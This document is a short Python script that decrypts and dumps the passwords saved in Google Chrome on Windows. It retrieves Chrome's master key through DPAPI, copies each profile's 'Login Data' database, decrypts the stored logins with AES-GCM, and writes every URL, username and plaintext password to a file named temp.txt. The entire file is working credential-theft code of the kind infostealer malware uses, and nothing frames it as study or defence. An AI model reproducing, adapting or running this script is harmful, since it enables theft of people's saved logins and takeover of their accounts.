import os
import sqlite3
import shutil
import json
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Function to get the local state encryption key
def get_encryption_key():
    local_state_path = os.path.join(
        os.getenv('LOCALAPPDATA'),
        r'Google\Chrome\User Data\Local State'
    )
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI header
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Function to decrypt the password using the encryption key
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        aes_gcm = AESGCM(key)
        return aes_gcm.decrypt(iv, payload, None).decode('utf-8')
    except Exception as e:
        return f"Unable to decrypt: {str(e)}"

# Function to extract passwords from a specific profile
def extract_passwords_from_profile(profile_path, encryption_key):
    passwords = []
    db_path = os.path.join(profile_path, "Login Data")
    if not os.path.exists(db_path):
        return passwords

    temp_db = "temp_LoginData.db"
    shutil.copyfile(db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            password = decrypt_password(encrypted_password, encryption_key)
            passwords.append((origin_url, username, password))
    except Exception as e:
        print(f"Error reading database for {profile_path}: {str(e)}")
    finally:
        conn.close()
        os.remove(temp_db)
    return passwords

# Main function to extract and save passwords from all profiles
def save_all_chrome_passwords():
    base_path = os.path.join(
        os.getenv('LOCALAPPDATA'),
        r'Google\Chrome\User Data'
    )
    encryption_key = get_encryption_key()
    all_passwords = []

    # Iterate through all profiles
    for profile in os.listdir(base_path):
        profile_path = os.path.join(base_path, profile)
        if os.path.isdir(profile_path) and ("Profile" in profile or profile == "Default"):
            print(f"Extracting passwords from profile: {profile}")
            passwords = extract_passwords_from_profile(profile_path, encryption_key)
            all_passwords.extend([(profile, *entry) for entry in passwords])

    # Save passwords to temp.txt
    with open("temp.txt", "w", encoding="utf-8") as file:
        file.write("Profile, URL, Username, Password\n")
        for entry in all_passwords:
            file.write(f"{entry[0]}, {entry[1]}, {entry[2]}, {entry[3]}\n")

    print("Passwords saved to temp.txt")

# Run the function
if __name__ == "__main__":
    save_all_chrome_passwords()
